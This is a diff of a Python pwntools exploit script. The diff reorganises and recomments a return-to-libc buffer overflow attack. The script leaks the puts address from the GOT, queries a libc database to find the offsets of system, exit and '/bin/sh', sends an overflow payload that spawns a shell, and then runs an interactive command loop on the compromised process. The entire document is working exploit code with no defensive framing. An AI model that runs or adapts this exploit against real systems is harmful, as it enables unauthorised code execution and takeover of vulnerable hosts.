@@ -21,20 +21,6 @@ HEADERS = {'Content-Type': 'application/json'}
 # Function Offsets
 PLT_PUTS, MAIN_ADDR, GOT_PUTS = 0x8048340, 0x804847b, 0x80497ac
 
-def handle_reverse_shell(redirect_stderr=True):
-    """
-    Handles the reverse shell interaction with the process.
-    """
-    try:
-        proc.sendline(b"whoami 2>&1" if redirect_stderr else b"whoami")
-        print(proc.recv(timeout=0.1).decode('utf-8'))
-        while True:
-            command = input("$ ")
-            proc.sendline(command.encode('utf-8') + (b" 2>&1" if redirect_stderr else b""))
-            print(proc.recv(timeout=0.2).decode('utf-8'))
-    except EOFError:
-        return 300
-    return 200
 
 def leak_via_puts(conn, port,put_out_addr, msg="puts"):
     """
@@ -57,46 +43,44 @@ def leak_via_puts(conn, port,put_out_addr, msg="puts"):
     log.success(f"Leaked address of {msg}: {hex(puts_addr)}")
     return puts_addr
 
-# Perform a return-to-libc attack executing system('/bin/sh')
+
 def attempt_r2libc(puts_offset, system_offset, exit_offset, binsh_offset):
-    # Leak randomised libc puts addr
+    """
+    Executes a return-to-libc attack to invoke system('/bin/sh').
+    """
+
+    # Leak puts address to get libc base address
     puts_addr = leak_via_puts(conn, port, GOT_PUTS)
+    log.success(f'Leaked libc puts address: {hex(puts_addr)}')
 
     # Get lib base addr using puts_offset
-    libc_address = puts_addr - puts_offset
-    log.success(f'LIBC base: {hex(libc_address)}')
+    libc_base = puts_addr - puts_offset
+    log.success(f'Calculated libc base address: {hex(libc_base)}')
 
-    system_bytes = p32(system_offset+libc_address)
-    exit_bytes = p32(exit_offset+libc_address)
-    binsh_bytes = p32(binsh_offset+libc_address)
+    # Prepare the ROP chain payload
+    system_addr = libc_base + system_offset
+    exit_addr = libc_base + exit_offset
+    binsh_addr = libc_base + binsh_offset
     
     # Create and send system('/bin/sh') buffer overflow payload
     payload = flat(
-        b'A' * buffSize, # Padding so the next bytes will overwrite the EIP
-        system_bytes,     # Overflowed function will execute system() on return
-        exit_bytes,       # system will execute libc's exit() on return
-        binsh_bytes,      # system's first pararmter 
+        b'A' * buffSize,
+        p32(system_addr), 
+        p32(exit_addr), 
+        p32(binsh_addr),
+
     )
 
     proc.sendline(payload)
-    log.success("Executed system('/bin/sh') overflow")
+    log.success("Triggered system('/bin/sh') via buffer overflow.")
 
-    # Ouput next lines so next recv will be the ouput of system('/bin/sh')
+    # Skip the output lines before the reverse shell
     for _ in range(OUTPUT_LINES_AFTER):
         print(proc.recv(timeout = 0.05))
     
-    # Check if reverse shell was spawned then handle user input and output for the process
+    # Attempt to interact with the reverse shell
     return handle_reverse_shell()
 
-def skip_lines(proc, lines):
-    """
-    Skips a specified number of lines in the process output.
-    """
-    for _ in range(lines):
-        try:
-            proc.recvline()
-        except EOFError:
-            pass
 
 def find_potential_libcs(puts_addr):
     """
@@ -105,6 +89,7 @@ def find_potential_libcs(puts_addr):
     data = {"symbols": {"puts": hex(puts_addr)}}
     response = requests.post(FIND_LIBC_URL, headers=HEADERS, data=json.dumps(data))
     return response.json()
+
 
 def get_libc_symbol_offsets(libc_id):
     """
@@ -131,6 +116,33 @@ def get_libc_symbol_offsets(libc_id):
 
     # Return the offsets
     return puts_off, system_off, exit_off, binsh_off
+
+
+def skip_lines(proc, lines):
+    """
+    Skips a specified number of lines in the process output.
+    """
+    for _ in range(lines):
+        try:
+            proc.recvline()
+        except EOFError:
+            pass
+
+
+def handle_reverse_shell(redirect_stderr=True):
+    """
+    Handles the reverse shell interaction with the process.
+    """
+    try:
+        proc.sendline(b"whoami 2>&1" if redirect_stderr else b"whoami")
+        print(proc.recv(timeout=0.1).decode('utf-8'))
+        while True:
+            command = input("$ ")
+            proc.sendline(command.encode('utf-8') + (b" 2>&1" if redirect_stderr else b""))
+            print(proc.recv(timeout=0.2).decode('utf-8'))
+    except EOFError:
+        return 300
+    return 200
 
 
 def main():
@@ -161,6 +173,7 @@ def main():
     else:
         print("All potential libc versions have been attempted. Exploit may have failed.")
         proc.close()
+
 
 if __name__ == "__main__":
     main()
